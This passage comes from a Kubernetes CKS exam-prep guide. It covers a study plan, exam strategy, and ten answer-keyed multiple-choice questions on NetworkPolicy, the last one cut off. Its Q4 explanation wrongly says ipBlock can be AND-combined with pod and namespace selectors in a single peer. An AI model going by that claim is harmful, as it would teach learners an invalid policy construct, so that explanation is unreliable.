🏠 Master Summary & Implementation RoadmapSTART HERE

🎯 What This Document Is — And How To Use It

This is your complete CKS exam preparation system. It's not just a study guide — it's a security training simulator built around a real Django application (anihpj/jobpost) running on your 6-cluster lab. Every section is designed to build security muscle memory through progressive difficulty: theory → security diagnostics → hands-on hardening.

📝

200 MCQs
Build security theory

Security diagnostics

15 Trees + 11 Appx
Quick reference

📝 Part 1: 200 Multiple Choice Questions

Purpose: Build foundational security knowledge across all 6 CKS domains. Every question has a detailed explanation with real-world security context from anihpj/jobpost.

Domains covered: Cluster Setup (Q1-Q30), Cluster Hardening (Q31-Q60), System Hardening (Q61-Q80), Microservice Vulnerabilities (Q81-Q120), Supply Chain Security (Q121-Q160), Monitoring & Runtime Security (Q161-Q200).

How to use: Answer 20-30 questions per study session. Read the explanation even for correct answers — they contain deeper security insights. Target: 85%+ correct before moving to Part 2.

🔧 Part 2: 100 Security Issues

Purpose: Learn systematic security diagnostic reasoning. Each issue follows the same pattern: Symptom → Terminal Output → 15 Causes (Most Likely / Less Likely / New Cluster) → Diagnostic Commands → Solution → Personal Security Advice.

Categories: CS1-CS15 (Cluster Setup), CH1-CH15 (Cluster Hardening), SH1-SH10 (System Hardening), MV1-MV20 (Microservice Vulns), SC1-SC20 (Supply Chain), ML1-ML20 (Monitoring & Runtime).

How to use: Read the symptom first — try to diagnose BEFORE reading the causes. This builds the security diagnostic muscle memory critical for the CKS exam.

🧪 Part 3: 100 Hands-On Security Lab Scenarios

Purpose: Practice real CKS exam tasks on your 6-cluster lab. Each scenario deploys anihpj/jobpost with an intentional security vulnerability — you find and harden it.

Structure per scenario: APP STORY → FILE STRUCTURE → Deploy YAML (with vulnerability) → Observe exploit → Debug commands → Full answer with before/after outputs → Hardening commands → Cleanup.

How to use: Run each scenario on the specified cluster (ksw → 1-6). Time yourself — aim for 5-7 minutes per scenario. Target: Complete all 100 scenarios before exam day.

🌳 Decision Trees + Appendices

Decision Trees (DT1-DT15): Quick security diagnostic flowcharts for the 15 most common CKS scenarios. Start at the symptom, answer yes/no questions, arrive at the fix.

Appendices (A-K): Answer keys, top 100 security commands, YAML templates, exam-day survival guide, CIS benchmark summary, compliance mapping, and the ⚡ Appendix C: 20 Exam Day Command Patterns — your last-30-minutes cram sheet.

How to use: Decision trees for quick reference during practice. Appendix C (Command Patterns) in the 30 minutes before exam. CIS Benchmark Summary (Appendix J) for last-minute review.

✅ Daily Implementation Checklist
  • Morning (30 min): Read 5-10 MCQs from Part 1 + review explanations. Focus on one security domain per day.
  • Afternoon (45 min): Study 3-5 Part 2 security issues. Read the symptom, try to diagnose, then read the solution. Note patterns you missed.
  • Evening (60 min): Run 3-5 Part 3 lab scenarios on your cluster. Type every hardening command — don't copy-paste. Time each scenario.
  • Weekend (2-3 hours): Full review of the week's topics. Run 10 scenarios back-to-back. Review decision trees for any weak areas.
  • Day before exam: Read Appendix C (20 Command Patterns) twice. Type patterns from memory. Review CIS Benchmark Summary (Appendix J). Get a good night's sleep.
  • Exam day morning: 30 minutes before: Read Appendix C one final time. Set up your environment: alias k=kubectl, export KUBECONFIG=..., verify context. Check kubeadm certs check-expiration.

🏆 Skills You'll Master — Before vs After This Guide

❌ BEFORE — Common Security Gaps

  • ❌ "My pods run as root" — Didn't know about securityContext
  • ❌ "Secrets are in plaintext in etcd" — No encryption at rest
  • ❌ "Anyone can exec into any pod" — RBAC not configured
  • ❌ "Container escaped to host" — No seccomp/AppArmor profiles
  • ❌ "Malicious image deployed to production" — No image signing or scanning
  • ❌ "Attack happened but no evidence" — Audit logging not enabled
  • ❌ "SBOM? Supply chain? What's that?" — No software provenance

✅ AFTER — Skills This Guide Builds

  • ✅ Harden any pod with securityContext, seccomp, and AppArmor profiles
  • ✅ Encrypt Secrets at rest, rotate credentials, use external secret stores
  • ✅ Design and audit RBAC with least-privilege for every ServiceAccount
  • ✅ Deploy and tune Falco for runtime threat detection with custom rules
  • ✅ Sign images with Cosign, verify signatures at admission, generate SBOMs
  • ✅ Configure comprehensive audit policies and ship logs to SIEM
  • ✅ Build a complete DevSecOps pipeline: scan → sign → attest → deploy → monitor

🚨 Critical Do's & Don'ts During The Exam
  • ✅ DO: Use kubectl create ... --dry-run=client -o yaml to generate YAML in seconds — never type security manifests from scratch.
  • ✅ DO: Run kubectl config use-context <given-context> as the FIRST command for every task. Wrong context = 0 points.
  • ✅ DO: Verify RBAC with kubectl auth can-i --list --as=<user> before and after changes. Know the verbs: get, list, watch, create, update, patch, delete.
  • ✅ DO: Use kubeadm certs check-expiration and openssl x509 -noout -dates to inspect certificate validity.
  • ❌ DON'T: Spend more than 7 minutes on any single task. Flag it, move on, return with fresh eyes.
  • ❌ DON'T: Forget security context fields: runAsNonRoot: true, readOnlyRootFilesystem: true, capabilities.drop: [ALL], allowPrivilegeEscalation: false.
  • ❌ DON'T: Leave any task blank. Even partial work (creating the NetworkPolicy YAML, writing partial RBAC rules) may earn partial credit.
  • ❌ DON'T: Forget --certificate-authority, --client-certificate, and --client-key flags when running etcdctl — etcd always requires TLS in CKS exam clusters.

📊 Exam Overview & StrategySTRATEGY

CKS Exam Format & Preparation Strategy

Exam Duration: 2 hours | Format: Performance-based (hands-on CLI) | Passing Score: 67% | Cost: $395 (includes one free retake) | Certification Validity: 3 years | Prerequisite: Must hold active CKA certification

6 Official Domains: Cluster Setup (15%), Cluster Hardening (15%), System Hardening (10%), Minimize Microservice Vulnerabilities (20%), Supply Chain Security (20%), Monitoring, Logging & Runtime Security (20%). Supply Chain + Microservice Vulns + Runtime Security = 60% of your score — focus your study accordingly.

Exam Strategy: Read all questions first (5 min) → Solve easy questions first → Flag and return to hard ones → Use kubectl explain and kubernetes.io/docs liberally → Always verify your security controls with kubectl describe/get/auth can-i. The exam environment provides full access to kubernetes.io documentation.

Your 6-cluster lab (below) mirrors real exam conditions. Use ksw to switch between clusters. Each scenario in Part 3 specifies which cluster to use and which security tools are pre-installed (Falco, Trivy, OPA/Gatekeeper, kube-bench).

📚 Pre-Learning: Kubernetes FoundationsF.1–F.5

🟢 Novice-Friendly: Building Your Mental Model

F.1 What Problem Does Kubernetes Solve? — From bare metal to VMs to containers to orchestration. The "it works on my machine" problem and how Kubernetes provides a consistent deployment platform.

F.2 Containers 101 — Docker & OCI — What IS a container? Dockerfile anatomy, image layers, registries. Multi-stage builds and distroless images for production.

F.3 Kubernetes Core Concepts — The "Big Picture" mental model: Cluster = Control Plane + Worker Nodes. Pods, declarative vs imperative, desired state reconciliation, kubectl basics.

F.4 The anihpj/jobpost Application Stack — Web tier (Django templates), API tier (Django REST Framework), Database tier (PostgreSQL 15), Redis (Celery + caching). Service discovery via DNS.

F.5 Kubernetes vs Docker Compose — Mental bridge: docker-compose.yml → Kubernetes YAML mapping. Why Kubernetes when Docker Compose works? The "Day 2" problem: self-healing, scaling, rolling updates.

If you're new to Kubernetes: Read through F.1–F.5 before diving into Part 1. These foundations will give you the mental models needed to understand the MCQs, troubleshooting issues, and lab scenarios. The entire guide uses the anihpj/jobpost Django application as its running example.

📝 Part 1: 200 Multiple Choice Questions

Complete CKS MCQ Bank — Organized by the 6 official Linux Foundation CKS exam domains. Each question includes a detailed explanation, diagrams, and real-world security context using anihpj/jobpost.

200Questions
6Categories
200Explanations

🔐 Category 1: Cluster Setup (15%)Q1-Q30

🟢 Novice-Friendly: Securing Your Cluster from the Ground Up

This category is about securing your Kubernetes cluster at the infrastructure level. Think of it like building a fortress — you start with the walls, gates, and guard posts (NetworkPolicies, TLS, CIS benchmarks) before you worry about what's inside. For anihpj/jobpost, this means ensuring pod-to-pod traffic is controlled, Ingress endpoints are TLS-protected, and your cluster components (API server, etcd, kubelet) pass CIS security benchmarks.

Q1-Q30 30 Questions 🟢 Beginner

1.1 Network Security & NetworkPolicy FundamentalsQ1-Q12

Cluster Setup Q1 of 200
What is a Kubernetes NetworkPolicy and what problem does it solve?
A) A NetworkPolicy is a firewall rule that blocks all external traffic to the cluster from the internet
B) A NetworkPolicy is a Kubernetes resource that acts as a "pod-level firewall" — it controls which pods can communicate with each other (ingress/egress) using selectors, effectively implementing micro-segmentation
C) A NetworkPolicy is a DNS policy that controls how pod hostnames resolve within the cluster
D) A NetworkPolicy is a load-balancing rule that distributes traffic across pod replicas
✅ Correct Answer: B

A NetworkPolicy is Kubernetes' built-in micro-segmentation firewall. It controls traffic flow at Layer 3/4 (IP address + port) between pods using label selectors, namespace selectors, and IP blocks — no VLANs or physical firewalls needed.

📝 Detailed Explanation
NetworkPolicy — The Pod-Level Firewall
  WITHOUT NetworkPolicy (default: ALL traffic allowed)
  ┌──────────────────────────────────────────────────────────────┐
  │  anihpj-web ──► anihpj-api ──► anihpj-db ──► anihpj-redis   │
  │  All pods can talk to ALL other pods — flat network           │
  │  ⚠️ Compromised web pod can directly access the database!     │
  └──────────────────────────────────────────────────────────────┘

  WITH NetworkPolicy (default-deny + explicit allows)
  ┌──────────────────────────────────────────────────────────────┐
  │  anihpj-web ──► anihpj-api:8000  ✅  (explicitly allowed)    │
  │  anihpj-web ──► anihpj-db:5432   ❌  (BLOCKED by policy!)    │
  │  anihpj-api  ──► anihpj-db:5432  ✅  (explicitly allowed)    │
  │  anihpj-api  ──► anihpj-redis:6379 ✅                        │
  │                                                               │
  │  Key insight: Web tier CANNOT talk directly to DB.           │
  │  It MUST go through the API. This limits blast radius.       │
  └──────────────────────────────────────────────────────────────┘

For anihpj/jobpost, this is critical: if the Django web frontend is compromised, the attacker cannot directly access PostgreSQL because NetworkPolicy only allows api → db:5432, not web → db:5432. This is the principle of least privilege applied to network traffic.

CKS Exam Note: NetworkPolicies are a CORE CKS topic. You MUST know: (1) They are ADDITIVE — multiple policies combine. (2) A pod is ISOLATED when ANY policy selects it for that direction. (3) They require a CNI that supports them — Calico, Cilium, and Weave Net work; Flannel alone does NOT.

Cluster Setup Q2 of 200
What is the difference between Ingress and Egress in a NetworkPolicy — which direction of traffic does each control?
A) Ingress controls traffic ENTERING the selected pods (inbound); Egress controls traffic LEAVING the selected pods (outbound)
B) Ingress controls traffic leaving the pod; Egress controls traffic entering the pod
C) Ingress is for external-to-cluster traffic only; Egress is for pod-to-pod traffic only
D) Ingress and Egress are interchangeable — they both control all traffic equally
✅ Correct Answer: A

Ingress = traffic coming INTO the selected pods (think: "inbound"). Egress = traffic going OUT of the selected pods (think: "outbound"). The podSelector in the policy defines WHICH pods these rules apply to.

📝 Detailed Explanation
Ingress vs Egress — Direction Matters
  ┌──────────────────────────────────────────────────────────────────┐
  │  NetworkPolicy: protect-db                                        │
  │  podSelector: {app: anihpj-db}  ← Policy applies TO database pod │
  │                                                                   │
  │  ┌─────────────────────────────────────────────────────────┐      │
  │  │  INGRESS (traffic INTO db pod):                          │      │
  │  │                                                            │      │
  │  │  anihpj-api ──────► anihpj-db:5432  ← INGRESS rule       │      │
  │  │                    (entering the db pod)                  │      │
  │  │                                                            │      │
  │  │  ingress:                                                  │      │
  │  │  - from: [{podSelector: {app: anihpj-api}}]              │      │
  │  │    ports: [{port: 5432}]                                  │      │
  │  │  → "Allow traffic FROM api TO db on port 5432"           │      │
  │  └─────────────────────────────────────────────────────────┘      │
  │                                                                   │
  │  ┌─────────────────────────────────────────────────────────┐      │
  │  │  EGRESS (traffic OUT OF db pod):                         │      │
  │  │                                                            │      │
  │  │  anihpj-db ──────► 8.8.8.8:53  ← EGRESS rule            │      │
  │  │               (leaving the db pod)                        │      │
  │  │                                                            │      │
  │  │  egress:                                                   │      │
  │  │  - to: [{ipBlock: {cidr: 0.0.0.0/0}}]                   │      │
  │  │    ports: [{port: 53, protocol: UDP}]                    │      │
  │  │  → "Allow db pod to send DNS queries anywhere"           │      │
  │  └─────────────────────────────────────────────────────────┘      │
  └──────────────────────────────────────────────────────────────────┘

Memory trick: Think from the POD'S perspective. Ingress = something is "entering" me. Egress = I am "exiting" to somewhere else. When a NetworkPolicy has podSelector: {app: db}, Ingress rules control who can talk TO the database, Egress rules control where the database can talk TO.

CKS Exam Note: If you only specify Ingress rules but NOT Egress, the pod is NOT isolated for egress — it can still send traffic anywhere. To fully lock down a pod, specify BOTH policyTypes: [Ingress, Egress] with explicit rules for each direction.

Cluster Setup Q3 of 200
Why is the default-deny pattern ("deny all traffic, then explicitly allow only what's needed") considered a fundamental security best practice for NetworkPolicies?
A) Default-deny makes pods start faster because they don't need to establish network connections
B) Default-deny is only required for compliance frameworks like PCI-DSS; it has no practical security benefit
C) Default-deny implements the principle of least privilege — it ensures that EVERY allowed connection is intentional and explicitly authorized. If a new pod is deployed or an attacker compromises a pod, that pod starts in a "locked down" state with zero network access
D) Default-deny reduces CPU usage because the CNI plugin processes fewer network packets
✅ Correct Answer: C

Default-deny is the network equivalent of "start with ALL doors locked, then only unlock the ones people actually need." Without it, Kubernetes allows ALL pod-to-pod communication — a flat, open network. Default-deny flips this: NOTHING is allowed unless a policy explicitly permits it.

📝 Detailed Explanation
Default-Allow vs Default-Deny — Blast Radius Comparison
  DEFAULT-ALLOW (no NetworkPolicy):
  ┌──────────────────────────────────────────────────────────────┐
  │  anihpj-web ←──→ anihpj-api ←──→ anihpj-db ←──→ anihpj-redis│
  │  ⚠️ Compromised web pod can:                                  │
  │     • Directly access PostgreSQL (dump all user data)         │
  │     • Connect to Redis (steal session tokens)                 │
  │     • Scan internal network for other targets                 │
  │  Blast radius: ENTIRE cluster                                 │
  └──────────────────────────────────────────────────────────────┘

  DEFAULT-DENY (with explicit allows):
  ┌──────────────────────────────────────────────────────────────┐
  │  ┌──────────┐     ┌──────────┐     ┌──────────┐              │
  │  │anihpj-web│────►│anihpj-api│────►│anihpj-db │              │
  │  │   :80    │:8000│  :8000   │:5432│  :5432   │              │
  │  └──────────┘     └────┬─────┘     └──────────┘              │
  │                        │ :6379                                │
  │                        ▼                                       │
  │                   ┌──────────┐                                │
  │                   │anihpj-redis                               │
  │                   │  :6379   │                                │
  │                   └──────────┘                                │
  │                                                               │
  │  ⚠️ Compromised web pod CAN ONLY access anihpj-api:8000       │
  │  Blast radius: SINGLE service (the API) — contained!          │
  └──────────────────────────────────────────────────────────────┘

  How to create default-deny:
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata: {name: default-deny-all, namespace: anihpj}
  spec:
    podSelector: {}      ← Selects ALL pods in namespace
    policyTypes: [Ingress, Egress]
    # No ingress/egress rules = NOTHING allowed

For anihpj/jobpost, default-deny means a newly deployed pod or a compromised container starts with ZERO network access. You then explicitly add NetworkPolicies to allow web→api, api→db, api→redis, and DNS egress. Everything else is blocked by default.

Cluster Setup Q4 of 200
A NetworkPolicy rule's from or to block can use three types of selectors. What are they and how do they combine?
A) Only podSelector — you can only filter traffic by pod labels
B) podSelector OR namespaceSelector — you must choose one, you cannot use both simultaneously
C) podSelector, namespaceSelector, and ipBlock — but only one works at a time; they override each other
D) podSelector, namespaceSelector, and ipBlock — they combine with AND logic within a single from/to block, and OR logic across multiple from/to blocks
✅ Correct Answer: D

The three selectors are: podSelector (match pods by label), namespaceSelector (match entire namespaces by label), and ipBlock (match IP ranges with CIDR notation). Within a SINGLE from/to block they combine with AND. Across MULTIPLE from/to blocks they combine with OR.

📝 Detailed Explanation
Selector Logic — AND Within, OR Across
  ┌──────────────────────────────────────────────────────────────────┐
  │  SINGLE from BLOCK (AND logic — ALL conditions must match):       │
  │                                                                   │
  │  ingress:                                                         │
  │  - from:                                                          │
  │    - podSelector: {app: anihpj-api}    ← AND                      │
  │      namespaceSelector: {team: backend} ← AND                     │
  │      ipBlock: {cidr: 10.244.0.0/16}    ← AND                     │
  │                                                                   │
  │  Result: ALLOW traffic only if:                                   │
  │  pod label IS app=anihpj-api                                      │
  │  AND pod is in namespace WITH label team=backend                  │
  │  AND source IP is in 10.244.0.0/16 range                          │
  └──────────────────────────────────────────────────────────────────┘

  ┌──────────────────────────────────────────────────────────────────┐
  │  MULTIPLE from BLOCKS (OR logic — ANY block can match):           │
  │                                                                   │
  │  ingress:                                                         │
  │  - from:                                                          │
  │    - podSelector: {app: anihpj-api}    ← OR                       │
  │  - from:                                                          │
  │    - ipBlock: {cidr: 10.0.0.0/8}       ← OR                      │
  │                                                                   │
  │  Result: ALLOW traffic from:                                      │
  │  pods WITH label app=anihpj-api                                   │
  │  OR from IP range 10.0.0.0/8 (e.g., office VPN)                  │
  └──────────────────────────────────────────────────────────────────┘

Memory trick: AND inside the curly braces, OR between the dashes. Multiple selectors in one - from: block = AND (narrower). Multiple - from: blocks = OR (wider).

Cluster Setup Q5 of 200
You create a NetworkPolicy but traffic still flows unrestricted. You check kubectl get networkpolicy and the policy exists. Why might it NOT be enforced?
A) NetworkPolicies only work on cloud-managed Kubernetes (EKS, GKE, AKS), not on self-managed clusters
B) Your CNI (Container Network Interface) plugin must support NetworkPolicy enforcement. CNIs like Calico, Cilium, and Weave Net support it; Flannel (without Calico) does NOT. A NetworkPolicy stored in etcd but not enforced by the CNI is just metadata — it has NO effect
C) NetworkPolicies require a special kernel module that must be manually loaded on each node
D) NetworkPolicies only take effect after a full cluster restart
✅ Correct Answer: B

NetworkPolicy is just a Kubernetes API object — it's stored in etcd but it's the CNI plugin's job to actually enforce it. If your CNI doesn't implement the NetworkPolicy API (like vanilla Flannel), your policies exist on paper but have ZERO effect on actual traffic.

📝 Detailed Explanation
The NetworkPolicy Enforcement Chain
  CNI COMPATIBILITY — NOT ALL CNIs ENFORCE NETWORK POLICIES:

  ✅ SUPPORTS NetworkPolicy (enforced):
  ┌──────────────────────────────────────────────────────────────┐
  │  Calico    ████████████████████  Market leader, iptables/eBPF│
  │  Cilium    ██████████████████    eBPF-based, high performance│
  │  Weave Net ████████████          Simple, built-in encryption │
  │  Kube-router ████████            Lightweight, BGP-based      │
  │  Antrea    ██████                Open vSwitch based          │
  └──────────────────────────────────────────────────────────────┘

  ❌ Does NOT enforce NetworkPolicy (policies stored but IGNORED):
  ┌──────────────────────────────────────────────────────────────┐
  │  Flannel (standalone)  ← Most common pitfall!                │
  │  (Flannel + Calico = works, Flannel alone = no enforcement)  │
  └──────────────────────────────────────────────────────────────┘

  HOW TO VERIFY:
  kubectl get pods -n kube-system | grep -E "calico|cilium|weave"
  → If no CNI pods with NetworkPolicy support → your policies are INERT

  HOW TO TEST:
  kubectl apply -f deny-all.yaml
  kubectl exec source-pod -- curl target-svc
  → If curl succeeds despite deny-all → CNI doesn't enforce policies!

For the CKS exam, you'll likely be using a cluster with Calico or Cilium pre-installed — NetworkPolicies WILL work. But in real-world self-managed clusters, always verify your CNI before relying on NetworkPolicies. This is one of the most common security gaps in production Kubernetes.

Cluster Setup Q6 of 200
You create two NetworkPolicies in the same namespace. Policy-A allows ingress from app=web on port 80. Policy-B denies all ingress. What happens?
A) Policy-B (deny) takes priority because it was created last — traffic is denied
B) Policy-A (allow) takes priority because allows override denies — traffic is allowed
C) Both policies combine with UNION logic — traffic IS allowed from app=web on port 80 because NetworkPolicies are ADDITIVE (there are NO priority numbers). The effective policy is the UNION of all allows across ALL policies
D) The two policies conflict and neither is enforced — default-allow applies
✅ Correct Answer: C

NetworkPolicies have NO priority, no ordering, no sequence numbers. Unlike firewall rules (where rule #1 takes precedence over rule #100), ALL NetworkPolicies in a namespace combine additively. The effective set of allowed traffic is the UNION of all allows across all policies that select the pod.

📝 Detailed Explanation
Additive Policy Model — UNION, Not Priority
  POLICY-A (allow-web):
  ┌──────────────────────────────────────────────────────┐
  │  podSelector: {app: anihpj-api}                      │
  │  ingress:                                            │
  │  - from: [{podSelector: {app: anihpj-web}}]          │
  │    ports: [{port: 80}]                               │
  │                                                      │
  │  Allows: web pods → api pods on port 80              │
  └──────────────────────────────────────────────────────┘
                          │
                          │  COMBINE (UNION)
                          │
  POLICY-B (deny-all):
  ┌──────────────────────────────────────────────────────┐
  │  podSelector: {}  ← selects ALL pods                 │
  │  policyTypes: [Ingress]                              │
  │  # No ingress rules = ALL ingress denied             │
  │                                                      │
  │  Denies: ALL ingress traffic                         │
  └──────────────────────────────────────────────────────┘
                          │
                          ▼
  ┌──────────────────────────────────────────────────────┐
  │  EFFECTIVE RESULT:                                    │
  │  Policy-A allows web→api:80                           │
  │  Policy-B denies everything else                      │
  │                                                       │
  │  Union of allows: {web→api:80} ∪ {} = {web→api:80}   │
  │  ✅ web→api:80 is ALLOWED (from Policy-A)             │
  │  ❌ Everything else DENIED (isolated by Policy-B)     │
  └──────────────────────────────────────────────────────┘

  ⚠️ KEY DIFFERENCE from traditional firewalls:
  Traditional: Rule 1 (ALLOW) → Rule 2 (DENY ALL) → DENY wins
  Kubernetes:  Policy-A (ALLOW) + Policy-B (DENY ALL) → ALLOW wins
  (because Policy-A's ALLOW is in the union of all policies)

This is why you can safely layer NetworkPolicies: a platform team can create a default-deny policy, while individual teams add their own allow policies for specific services. They don't conflict — they combine.

Cluster Setup Q7 of 200
When is a pod considered "isolated" for ingress or egress traffic under the NetworkPolicy model?
A) A pod is isolated for a traffic direction (ingress/egress) the moment ANY NetworkPolicy in its namespace selects it AND specifies that policyType. For example, if any policy selects pod-X with policyTypes: [Ingress], pod-X is immediately isolated for ingress — only traffic explicitly allowed by policies will reach it
B) A pod is only isolated if ALL NetworkPolicies in the namespace explicitly deny traffic
C) A pod is isolated only after you create a policy with podSelector: {} (selecting all pods)
D) A pod is never truly isolated — NetworkPolicies only provide monitoring, not enforcement
✅ Correct Answer: A

Isolation is trigger-based, not threshold-based. As soon as ONE policy selects a pod for a direction, that pod is isolated for that direction. Before any policy selects it, traffic flows freely (default-allow). After the first policy selects it, only explicitly allowed traffic passes.

📝 Detailed Explanation
Pod Isolation — The Trigger Point
  TIMELINE: Pod anihpj-api in namespace "anihpj"

  T0: No NetworkPolicies exist
      ┌──────────────────────────────────────────────┐
      │ anihpj-api: NOT isolated (default-allow)     │
      │ ANY pod can reach anihpj-api on any port     │
      └──────────────────────────────────────────────┘

  T1: User creates NetworkPolicy allow-monitoring:
      podSelector: {tier: monitoring}  ← does NOT select anihpj-api
      policyTypes: [Ingress]
      ┌──────────────────────────────────────────────┐
      │ anihpj-api: STILL not isolated               │
      │ (policy doesn't select it → no effect)       │
      └──────────────────────────────────────────────┘

  T2: User creates NetworkPolicy allow-web-to-api:
      podSelector: {app: anihpj-api}  ← SELECTS anihpj-api!
      policyTypes: [Ingress]
      ingress: [{from: [{podSelector: {app: anihpj-web}}]}]
      ┌──────────────────────────────────────────────┐
      │ anihpj-api: NOW ISOLATED for ingress!        │
      │ ⚡ THE MOMENT this policy was created,        │
      │    ONLY anihpj-web can reach anihpj-api      │
      │    ALL other ingress traffic is DROPPED      │
      └──────────────────────────────────────────────┘

  KEY INSIGHT: Isolation happens INSTANTLY. If the allow-web-to-api
  policy doesn't include DNS pods or monitoring pods, those services
  will suddenly lose connectivity. Always create ALLOW policies BEFORE
  any policy that would isolate your pods!

This is a common production outage pattern: someone creates a NetworkPolicy to lock down one service, not realizing it instantly isolates that pod, breaking monitoring, logging, and health checks that weren't explicitly allowed.

Cluster Setup Q8 of 200
For anihpj/jobpost, you need to allow anihpj-web → anihpj-api:8000 and anihpj-api → anihpj-db:5432. Which NetworkPolicy setup correctly implements this?
A) One policy with podSelector: {} and both web and db listed in the ingress rules — a single catch-all policy
B) Only an egress policy on the web pod — egress rules are sufficient because they prevent return traffic
C) One policy on the web pod allowing egress to the db — since web needs to reach the database directly for performance
D) Two separate policies: Policy-1 selects anihpj-api with ingress from anihpj-web:8000, Policy-2 selects anihpj-db with ingress from anihpj-api:5432. Web can reach API, API can reach DB, but web CANNOT directly reach DB — implementing defense-in-depth
✅ Correct Answer: D

This is the correct tiered security model for a 3-tier application. Each tier only has access to the tier directly below it. The web tier cannot bypass the API to directly access the database — this is defense-in-depth.

📝 Detailed Explanation
anihpj/jobpost — Tiered NetworkPolicy Design
  ┌──────────────────────────────────────────────────────────────────┐
  │  POLICY 1: allow-web-to-api                                       │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ apiVersion: networking.k8s.io/v1                            │  │
  │  │ kind: NetworkPolicy                                         │  │
  │  │ metadata: {name: allow-web-to-api, namespace: anihpj}       │  │
  │  │ spec:                                                       │  │
  │  │   podSelector: {matchLabels: {app: anihpj-api}}  ← TARGET  │  │
  │  │   policyTypes: [Ingress]                                    │  │
  │  │   ingress:                                                  │  │
  │  │   - from: [{podSelector: {matchLabels: {app: anihpj-web}}}] │  │
  │  │     ports: [{port: 8000, protocol: TCP}]                    │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                   │
  │  POLICY 2: allow-api-to-db                                        │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ apiVersion: networking.k8s.io/v1                            │  │
  │  │ kind: NetworkPolicy                                         │  │
  │  │ metadata: {name: allow-api-to-db, namespace: anihpj}        │  │
  │  │ spec:                                                       │  │
  │  │   podSelector: {matchLabels: {app: anihpj-db}}   ← TARGET  │  │
  │  │   policyTypes: [Ingress]                                    │  │
  │  │   ingress:                                                  │  │
  │  │   - from: [{podSelector: {matchLabels: {app: anihpj-api}}}] │  │
  │  │     ports: [{port: 5432, protocol: TCP}]                    │  │
  │  └────────────────────────────────────────────────────────────┘  │
  └──────────────────────────────────────────────────────────────────┘

  RESULT:
  anihpj-web ──► anihpj-api:8000  ✅ (Policy 1 allows)
  anihpj-web ──► anihpj-db:5432   ❌ (No policy allows this path!)
  anihpj-api  ──► anihpj-db:5432  ✅ (Policy 2 allows)
  anihpj-api  ──► anihpj-redis    ❌ (No policy → blocked by default-deny)

This pattern is called micro-segmentation. Even if the web frontend is fully compromised (RCE), the attacker cannot directly access the database — they must go through the API, which has its own authentication, authorization, rate limiting, and audit logging.

Cluster Setup Q9 of 200
Your anihpj-api pod needs to connect to an external payment gateway at api.payments.com:443 but should NOT be able to reach any other external IP. Which NetworkPolicy rule achieves this?
A) An ingress rule allowing traffic from api.payments.com — because external connections are always ingress
B) An egress rule with ipBlock allowing the specific CIDR of api.payments.com on port 443, PLUS an egress rule allowing DNS (UDP 53) so the pod can resolve the hostname. Without DNS egress, the pod cannot resolve "api.payments.com" to an IP
C) An ingress rule on port 443 — egress rules are only for pod-to-pod traffic within the cluster
D) Simply omit the podSelector — NetworkPolicies automatically restrict all outbound traffic by default
✅ Correct Answer: B

Egress rules control WHERE pods can send traffic. To restrict outbound access, you need: (1) An egress rule allowing the specific destination IP/CIDR and port, and (2) CRITICALLY — an egress rule allowing DNS (UDP 53 to your DNS server) so pods can resolve hostnames. Without DNS egress, api.payments.com cannot be resolved to an IP address.

📝 Detailed Explanation
Egress Control — DNS Is the Hidden Dependency
  ┌──────────────────────────────────────────────────────────────────┐
  │  RESTRICTIVE EGRESS POLICY for anihpj-api:                        │
  │                                                                   │
  │  apiVersion: networking.k8s.io/v1                                 │
  │  kind: NetworkPolicy                                              │
  │  metadata: {name: api-egress, namespace: anihpj}                  │
  │  spec:                                                            │
  │    podSelector: {matchLabels: {app: anihpj-api}}                  │
  │    policyTypes: [Egress]                                          │
  │    egress:                                                        │
  │    - to:                                                          │
  │      - ipBlock: {cidr: 203.0.113.0/24}   ← Payment API IP       │
  │      ports: [{port: 443, protocol: TCP}]                          │
  │    - to:                                                          │
  │      - namespaceSelector: {matchLabels: {name: kube-system}}      │
  │        podSelector: {matchLabels: {k8s-app: kube-dns}}            │
  │      ports: [{port: 53, protocol: UDP}]  ← DNS (REQUIRED!)       │
  └──────────────────────────────────────────────────────────────────┘

  THE DNS TRAP — Most Common Egress Mistake:

  ❌ WITHOUT DNS EGRESS:
  ┌──────────────────────────────────────────────────────────────┐
  │ 1. anihpj-api tries: curl https://api.payments.com          │
  │ 2. DNS lookup: api.payments.com → 203.0.113.45              │
  │ 3. DNS packet DROPPED by NetworkPolicy! (UDP 53 blocked)    │
  │ 4. curl: "Could not resolve host: api.payments.com"         │
  │                                                              │
  │ ⚠️ The egress rule for 203.0.113.0/24:443 NEVER triggers    │
  │    because the pod can't even resolve the hostname!         │
  └──────────────────────────────────────────────────────────────┘

  ✅ WITH DNS EGRESS:
  ┌──────────────────────────────────────────────────────────────┐
  │ 1. DNS lookup: api.payments.com → 203.0.113.45 ✅ ALLOWED   │
  │ 2. TCP connect: anihpj-api → 203.0.113.45:443 ✅ ALLOWED    │
  │ 3. Payment API call succeeds!                                │
  └──────────────────────────────────────────────────────────────┘

Golden rule: Any time you create an egress-restricting NetworkPolicy, ALWAYS include a DNS egress rule. Without it, your pods can't resolve any external hostnames. This is the #1 cause of "my egress policy broke everything" incidents.

Cluster Setup Q10 of 200
The anihpj namespace needs to allow traffic from pods in the monitoring namespace (labeled team=observability) to anihpj-api on port 9090 (metrics). How do you write a NetworkPolicy using namespaceSelector?
A) Create a NetworkPolicy in the monitoring namespace — NetworkPolicies are always defined in the SOURCE namespace
B) Use podSelector alone with a special cross-namespace label — namespaceSelector is deprecated
C) Create a NetworkPolicy in the anihpj namespace with podSelector targeting anihpj-api, and in the ingress from block, use namespaceSelector: {matchLabels: {team: observability}} combined with podSelector for the specific monitoring pod. This allows traffic from pods in namespaces with team=observability
D) NetworkPolicies cannot span namespaces — you must use a ClusterNetworkPolicy (a separate CRD)
✅ Correct Answer: C

namespaceSelector allows NetworkPolicies to reference pods in OTHER namespaces by matching the NAMESPACE'S labels (not the pod's labels). This is how you implement cross-namespace security rules.

📝 Detailed Explanation
namespaceSelector — Cross-Namespace Traffic Control
  ┌──────────────────────────────────────────────────────────────────┐
  │  NETWORKPOLICY in "anihpj" namespace:                             │
  │                                                                   │
  │  apiVersion: networking.k8s.io/v1                                 │
  │  kind: NetworkPolicy                                              │
  │  metadata: {name: allow-monitoring, namespace: anihpj}            │
  │  spec:                                                            │
  │    podSelector: {matchLabels: {app: anihpj-api}}  ← TARGET pod   │
